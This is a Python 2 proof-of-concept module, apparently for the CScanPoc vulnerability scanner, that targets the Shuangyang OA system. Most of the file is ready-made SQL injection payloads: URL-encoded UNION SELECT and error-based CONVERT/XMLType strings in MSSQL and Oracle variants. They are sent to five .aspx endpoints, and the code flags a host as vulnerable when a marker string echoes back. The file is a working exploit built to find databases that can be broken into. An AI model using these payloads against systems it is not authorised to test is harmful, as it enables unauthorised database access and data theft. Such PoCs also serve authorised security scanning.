# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'shuangyang_0002' # 平台漏洞编号，留空
    name = '双杨OA系统 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-05-25'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '双杨OA系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f9a32faa-c9bf-4ba6-b8a2-a5ebfe27067c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
			#refer:http://www.wooyun.org/bugs/wooyun-2010-0115584
			#refer:http://www.wooyun.org/bugs/wooyun-2010-0116019
			#refer:http://www.wooyun.org/bugs/wooyun-2010-0116142
			#refer:http://www.wooyun.org/bugs/wooyun-2010-056570
			#refer:http://www.wooyun.org/bugs/wooyun-2010-055573
            hh = hackhttp.hackhttp()
            payloads = [ 
                '/goods/GoodsAdd.aspx?goodsid=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%2897%29%2bCHAR%2868%29%2bCHAR%2874%29%2bCHAR%2880%29%2bCHAR%28106%29%2bCHAR%2868%29%2bCHAR%2867%29%2bCHAR%28108%29%2bCHAR%2887%29%2bCHAR%28105%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%28120%29%2bCHAR%28112%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&flag=2',
                '/goods/GoodsAdd.aspx?goodsid=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2897%29%7C%7CCHR%2868%29%7C%7CCHR%2874%29%7C%7CCHR%2880%29%7C%7CCHR%28106%29%7C%7CCHR%2868%29%7C%7CCHR%2867%29%7C%7CCHR%28108%29%7C%7CCHR%2887%29%7C%7CCHR%28105%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--%20&flag=2'
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url)
                if 'qzqzqaDJPjDClWiqbxpq' in res :
		            #security_hole(arg + 'goods/GoodsAdd.aspx?goodsid=1&flag=2')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))


            payloads = [
                '/Personnel/Infomation.aspx?userid=1%20AND%203798%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2bCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28118%29%2bCHAR%28113%29%2b%28SELECT%20%28CASE%20WHEN%20%283798%3D3798%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29END%29%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%28107%29%2bCHAR%28118%29%2bCHAR%28113%29%29%29',
                '/Personnel/Infomation.aspx?userid=1%20AND%204369%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284369%3D4369%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29'
            ]
            for payload in payloads:
                url = self.target + payload 
                code, head, res, errcode, _ = hh.http(url)
                if 'qqzvq1qbkvq' in res:
		            #security_hole(arg + 'Personnel/Infomation.aspx?userid=1')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

		        
            payloads = [
                '/modules/pdflist.aspx?info_id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2bCHAR%2898%29%2bCHAR%28112%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%28102%29%2bCHAR%2897%29%2bCHAR%2876%29%2bCHAR%28113%29%2bCHAR%28109%29%2bCHAR%2872%29%2bCHAR%2888%29%2bCHAR%28108%29%2bCHAR%28117%29%2bCHAR%2877%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL--',
                '/modules/pdflist.aspx?info_id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28102%29%7C%7CCHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28113%29%7C%7CCHR%28109%29%7C%7CCHR%2872%29%7C%7CCHR%2888%29%7C%7CCHR%28108%29%7C%7CCHR%28117%29%7C%7CCHR%2877%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
            ]
            for payload in payloads:
                url = self.target + payload 
                code, head, res, errcode, _ = hh.http(url)
                if 'qbpkqfaLqmHXluMqpxqq' in res:
		            #security_hole(arg + 'modules/pdflist.aspx?info_id=1')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
		            
		    
            payloads = [
                '/help/HelpShowTip.aspx?helpid=-1%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%2898%29%2bCHAR%28113%29%2bCHAR%2874%29%2bCHAR%28116%29%2bCHAR%2897%29%2bCHAR%28107%29%2bCHAR%2898%29%2bCHAR%28118%29%2bCHAR%28120%29%2bCHAR%28103%29%2bCHAR%28103%29%2bCHAR%2886%29%2bCHAR%28113%29%2bCHAR%28107%29%2bCHAR%28122%29%2bCHAR%28120%29%2bCHAR%28113%29--',
                '/help/HelpShowTip.aspx?helpid=1%27%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2874%29%7C%7CCHR%28116%29%7C%7CCHR%2897%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28103%29%7C%7CCHR%28103%29%7C%7CCHR%2886%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%20FROM%20DUAL--'
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url)
                if 'qzpbqJtakbvxggVqkzxq' in res :
		            #security_hole(arg + 'help/HelpShowTip.aspx?helpid=1')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

		            
            payloads = [
                '/help/HelpShow.aspx?id=1%20AND%204874%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2bCHAR%28113%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2b%28SELECT%20%28CASE%20WHEN%20%284874%3D4874%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28122%29%2bCHAR%28106%29%2bCHAR%28113%29%29%29',
                '/help/HelpShow.aspx?id=1%20AND%205279%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%285279%3D5279%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2858%29%29%29FROM%20DUAL%29'
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url)
                if 'qqqxq1qvzjq' in res :
		            #security_hole(arg + 'help/HelpShow.aspx?id=1')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))


        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()

